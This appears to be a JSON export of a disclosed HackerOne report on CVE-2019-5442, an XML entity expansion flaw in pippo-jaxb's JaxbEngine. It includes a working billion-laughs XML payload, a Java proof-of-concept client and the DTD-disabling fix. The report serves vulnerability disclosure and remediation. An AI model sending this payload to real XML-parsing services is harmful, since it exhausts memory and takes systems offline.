{
  "id": 506791,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY3OTE=",
  "url": "https://hackerone.com/reports/506791",
  "title": "Pippo XML Entity Expansion (Billion Laughs Attack)",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "high",
  "readable_substate": "Informative",
  "created_at": "2019-03-08T15:19:48.688Z",
  "submitted_at": "2019-03-08T15:19:48.688Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "amassey",
    "url": "/amassey",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35524,
    "url": "https://hackerone.com/central-security-project",
    "handle": "central-security-project",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Central Security Project",
      "twitter_handle": "",
      "website": "https://www.sonatype.com/central-security-project",
      "about": "Ensuring Safer Open Source Across Ecosystems"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-5442"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-06-10T14:04:43.537Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-06-10T14:04:32.386Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Maven artifact\n**groupId:** ro.pippo\n**artifactId:** pippo-jaxb\n**version:** 1.12.0\n\n# Vulnerability\n## Vulnerability Description\n> Pippo unsafely parses user provided XML. The `fromString()` in the `ro.pippo.jaxb.JaxbEngine` class allows user provided DTDs that the rest of the XML may reference. This can lead to recursive entity expansion and a subsequent billion laughs attack.\n\n## Additional Details\n**Source File and Line Number:** https://github.com/pippo-java/pippo/blob/7da9f4db945d10113cf4ea4ed44ba0f1a7f83a8f/pippo-content-type-parent/pippo-jaxb/src/main/java/ro/pippo/jaxb/JaxbEngine.java#L78\n\n## Steps To Reproduce:\n> Detailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.\n\n1. Supply below XML payload as an argument to the following Java main method which is a client of Pippo.\n2. Enjoy watching the JVM crash.\n\n### XML Payload that Results in Recursive Entity Expansion\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE PERSON [\n        <!ENTITY PERSON \"PERSON\">\n        <!ELEMENT PERSON (#PCDATA)>\n        <!ENTITY PERSON1 \"&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;\">\n        <!ENTITY PERSON2 \"&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;\">\n        <!ENTITY PERSON3 \"&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;\">\n        <!ENTITY PERSON4 \"&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;\">\n        <!ENTITY PERSON5 \"&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;\">\n        <!ENTITY PERSON6 \"&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;\">\n        <!ENTITY PERSON7 \"&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;\">\n        <!ENTITY PERSON8 \"&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;\">\n        <!ENTITY PERSON9 \"&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;\">\n        ]>\n\n<PERSON>&PERSON9;</PERSON>\n```\n\n### Java Code that acts as a Pippo Client\n```\nimport org.apache.commons.io.IOUtil;\nimport ro.pippo.jaxb.JaxbEngine;\nimport java.io.IOException;\n\n\npublic class JaxBEnginePoC {\n\n    public static void main(String[] args) throws IOException {\n\n        String resourceName = args[0];\n\n        String payload = IOUtil.toString(\n                JaxBEnginePoC.class.getResourceAsStream(resourceName),\n                \"UTF-8\"\n        );\n\n        JaxbEngine jaxbEngine = new JaxbEngine();\n        Object myObj = jaxbEngine.fromString(payload, Person.class);\n\n        System.out.println(\"Completed!\");\n    }\n}\n```\n\n## Patch\n> If you're able to provide a patch with the fix, please post it in this section (or attach)\n\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, true); \n\nShould Be\n\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n\n## Supporting Material/References:\n> State all technical information about the stack where the vulnerability was found\n- Darwin Kernel Version 18.2.0\n- Java jdk1.8.0_171\n\n# Wrap up\n> Select Y or N for the following statements:\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n> Finder's comments and funny memes goes here\n\nhttp://i.imgur.com/3POtveC.jpg\n\nIs it pronounced imgur or imgur? Gif or Gif?\n\n## Impact\n\nIt causes a DoS. Specifically: Entities are created recursively and large amounts of heap memory is taken. Eventually, the JVM process will run out of memory. Otherwise, if the OS does not bound the memory on that process, memory will continue to be exhausted and will affect other processes on the system.",
  "weakness": {
    "id": 96,
    "name": "XML Entity Expansion"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 437737,
      "file_name": "pippo-poc-1.0-SNAPSHOT-sources.jar",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/737/a986600e7d9c20265a161d02a87d1e214485f5ee/pippo-poc-1.0-SNAPSHOT-sources.jar?response-content-disposition=attachment%3B%20filename%3D%22pippo-poc-1.0-SNAPSHOT-sources.jar%22%3B%20filename%2A%3DUTF-8%27%27pippo-poc-1.0-SNAPSHOT-sources.jar&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5JXNTXV%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T152421Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFd2EZOfh7WK2wWwDSBCNh4P6u5%2B72aiRZH5Vhf7FueQAiEAsUCYpSvAJ4u%2BoPmQ0kHxky90MvwOollB0PY4L9dmk1YqsgUIFhADGgwwMTM2MTkyNzQ4NDkiDNv8X0SSOdFfmIgKLiqPBQBfLo5UGrGPh1qAcZBHmR0KDaLUDst4e4flGr3RC%2F9LWAarXPz%2BftRUuzAQfHMc3rCLWyZk6Ytl3VRkXA2YBxYv0huh94REXzDZdiH5BR1y%2FELThTYydY4jzk%2BV3MxJhPfq%2BkYMz9YUFdUPFWfhjyzK1XqCu2cMzMUshJa507jC3UsHeOK5WTNhR8%2FVs4fS2NOTwRMoUKIFSw6u%2FLO%2BfvTCrn3ka2leOOgw7wTvhwc2OTo%2F0NMZjx5dRLAB%2BnzfceNUaFe5uqObru39sWP9FED7%2BrYJsHyDC654bkuz7TN4lRvR1HLvGmf10rfdONdmqzyZieUpKttDQ0vRieKf3lPWdmztI8euqjjENjK7zUbkJffYERzq0bzt1JOV%2BWdrEB2gL%2FQCvjWBgV9qldp1L32cB0xmVpWRfjvomvo813cxbBn1ThAZmKGyLrrcxmpv678WHN6%2BR3TYkY7PTg34%2FnZpED99A3CTvMhZQ%2FbPijgBfqK3bwSxGDRV0WUDhltW2VguN1H%2FKvjZPW%2BCX6ue0HO6BWyaOXCsAVL8%2BZkNIuAcdppO3oPqyJGG%2BCCz%2BskGSfEJofc2mA48Jy2e6jk4DSBbhAiexhme2EJd7KNIw5hWfw1WXQkCG%2B%2Fc7Jd3BCJmM7pDzaK9ebGMVyfcx%2FN1eQy2WMeLQCp0Qc3zdhLQDXyTZmTceObeJ3e17pVt5LDaQFv5xhWvDgGdEm1KJlVN3qay7J94ZpvCHVRM9UVr%2BP2vRZEwoii%2BcZNGK%2BkFanmgz6lm84SUx6BigWKqxfYR86MYdwdExTtT9pzUzol%2Bqzt7zrveASEiHhtWhFEYcO0ZukP5tZQiI7VKR7c26kqtVYH9oRJqQwaHc7mwNV0GApAwkuS%2FxgY6sQGyTmgbf6gQuq%2BthZuiZ6pB4kOHIQ20pH%2B9WBUnGOIMznQQ6%2F030BDCAYR%2F7EMbPs7WOTZYyIw0xOd8jYtkzCDAIFcHGRj0YPkw7ezCDeFGy9ClBM8E%2BaBqjevhYoL3MnMsY5%2FuARjyxsGlwIuB41GEew97zpfe4m7bFIWWDqAuLbUV3urBqxGRm%2B6ue8j92kz6MbCRq%2B9y%2BtTBd9%2BFMZfje9jXEI84haVb0Do8ij1mZwc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f87dc4451cbed20f6ecfe36b93ad8993d7d594ae9e24d5e04f2f20be3a79e84c",
      "file_size": 2871,
      "type": "application/zip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "tiago-danin"
  ],
  "severity": {
    "rating": "high",
    "score": 8.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 17122,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Java Component in search.maven.org",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
